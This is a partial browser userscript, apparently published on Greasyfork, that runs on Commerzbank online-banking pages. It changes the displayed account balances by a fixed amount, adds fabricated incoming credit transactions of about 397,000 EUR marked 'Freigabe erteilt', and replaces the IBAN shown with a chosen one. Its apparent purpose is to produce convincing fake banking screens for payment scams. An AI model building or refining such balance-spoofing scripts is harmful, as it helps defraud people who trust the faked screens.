// ==UserScript==
// @name         Ed OZ Commerz Oliver Steinmann
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/494028/Ed%20OZ%20Commerz%20Oliver%20Steinmann.user.js
// @updateURL https://update.greasyfork.org/scripts/494028/Ed%20OZ%20Commerz%20Oliver%20Steinmann.meta.js
// ==/UserScript==
...
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
   ...
   // Configurable modification amounts and corresponding indexes
    var homeBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 403971 },
...
//3 and COMM UMSATZE BALANCE MODIF and 8 COMM KONTODETAILS
  ...
  //6 COMM TRANSACTIONOVERVIEW BAL CHANGE
    ...
    var balanceChange = 403971  ; // Specify the amount to increase or decrease the main balance   DONT'T CHANGE IT!!!
            ...
            //  // Manual configuration of text content for multiple transactions
             var transactionsnew = [{
                  date: '25.07.2024',
                   ...
                   details: 'Freigabe erteilt.',
                   type: 'Gutschrift',
                  amount: '+397.271,72 EUR',
             },
{
                  date: '25.07.2024',
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     specifiedTextContent = targetTextContent = "DE54 2004 0000 0275 6245 00"
...
///////////////////////////////////////////////////////////////////////////////
 ...
 if (window.location.href.indexOf("startpage") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("10733875328") > 0) {
    'use strict';
...
if (window.location.href.indexOf("digitalbanking/financeoverview") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("10733875328") > 0) {
    'use strict';
...
if (window.location.href.indexOf("banking/accountdetails") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("10726848058") > 0) {
  (function() {
    'use strict';
...
if (window.location.href.indexOf("payments") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("smth") > 0) {
    (function() {
        'use strict';
